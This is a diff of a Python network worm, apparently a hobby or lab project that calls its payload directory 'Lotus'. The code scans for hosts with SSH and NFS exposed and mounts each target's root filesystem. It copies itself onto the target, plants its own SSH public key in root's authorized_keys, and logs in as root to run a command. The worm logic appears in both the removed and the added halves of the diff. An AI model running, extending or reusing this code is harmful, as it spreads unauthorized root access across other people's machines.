@@ -46,9 +46,37 @@ def ssh():
             if nm[host]['tcp'][22]['state'] == 'open' and nm[host]['tcp'][111]['state'] == 'open' and nm[host]['tcp'][2049]['state'] == 'open':                              #Validate port 22 is open on 'host'
                 ssh_list.append(host)                                               #Add validated hosts to ssh_list
     print('Scan Complete!')
-    return(ssh_list)                                                                #Return the contents of ssh_list
+    return(ssh_list)                                                                #Return the contents of ssh_list                                                           #target_list is returned
 
-def check2():                                                                      #A check to determine if our worm is already installed on a target
+def worm():
+    try:
+        for ip in check():
+            print('Starting Worm . . .')
+            os.makedirs('/tmp/r00t', exist_ok = True)
+            subprocess.run(['mount -t nfs ' + str(ip) + ':/ /tmp/r00t/'], shell=True)
+            subprocess.call(['cp', '-r', '/Lotus', '/tmp/r00t'])
+            print('Copying complete, attempting ssh')
+            subprocess.run(['ssh-keyscan ' + str(ip) + '>> ~/.ssh/known_hosts'], shell=True)
+            proc = subprocess.Popen(['ssh-keygen -t rsa -f ~/.ssh/id_rsa'],stdout=PIPE, stdin=PIPE, shell=True)
+            proc.communicate(input=base64.encodebytes('y'.encode()))
+            proc.communicate()
+            subprocess.call(['cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys'], shell=True)
+            time.sleep(5)
+            subprocess.run(['umount /tmp/r00t'], shell=True)
+            time.sleep(5)
+            print('Opening ssh connection. . .')
+            subprocess.run(['ssh', '-t', 'root@'  + str(ip), ssh_command])
+            print('Complete!')
+    except:
+        pass
+
+def check():
+    if path.exists('/Lotus') == True:
+        print('Root Path Found')
+    elif path.exists('/Lotus') == False:
+        print('Root file not found, creating . . .')
+        cwd = os.getcwd()
+        subprocess.run(['cp', '-r', cwd, '/Lotus'])
     target_list = []                                                                #Create a list to hold valid target ip's without our worm installed
     for ip in ssh():                                                             #Iterate over the ip's returned from the 'ssh' function        
         if ip not in h_ip:
@@ -60,38 +88,10 @@ def check2():                                                                   
         print('No Valid Targets!')
     else:
         print('Target(s) validated:' + str(target_list))
-        return(target_list)                                                             #target_list is returned
+        return(target_list)
 
-def worm():
-    try:
-        for ip in check2():
-            print('Starting Worm . . .')
-            os.makedirs('/tmp/r00t', exist_ok = True)
-            subprocess.run(['mount -t nfs ' + str(ip) + ':/ /tmp/r00t/'], shell=True)
-            subprocess.call(['cp', '-r', '/Lotus', '/tmp/r00t'])
-            print('Copying complete, attempting ssh')
-            subprocess.run(['ssh-keyscan ' + str(ip) + '>> ~/.ssh/known_hosts'], shell=True)
-            proc = subprocess.Popen(['ssh-keygen -t rsa -f ~/.ssh/id_rsa'],stdout=PIPE, stdin=PIPE, shell=True)
-            proc.communicate(input=base64.encodebytes('y'.encode()))
-            proc.communicate()
-            subprocess.call(['cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys'], shell=True)
-            subprocess.run(['umount /tmp/r00t'], shell=True)
-            subprocess.run(['ssh', '-t', 'root@'  + str(ip), ssh_command])
-            print('Complete!')
-    except:
-        pass
-
-def check1():
-    if path.exists('/Lotus') == True:
-        print('Root Path Found')
-        worm()
-    elif path.exists('/Lotus') == False:
-        print('Root file not found, creating . . .')
-        cwd = os.getcwd()
-        subprocess.run(['cp', '-r', cwd, '/Lotus'])
-        worm()
 def main():
-    check1()
+    worm()
 if __name__ == '__main__':
     main()
 
